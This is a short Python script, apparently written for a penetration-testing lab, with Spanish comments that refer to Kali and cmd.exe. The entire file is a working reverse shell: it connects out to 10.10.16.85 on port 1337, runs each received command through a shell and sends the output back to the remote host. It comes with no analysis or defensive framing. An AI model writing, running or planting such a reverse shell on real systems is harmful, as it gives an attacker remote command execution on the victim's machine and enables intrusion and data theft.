import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.85", 1337))

while True:
    # Recibir comando desde Kali
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    # Ejecutar en cmd.exe
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    s.send(output.stdout.read() + output.stderr.read())

s.close()


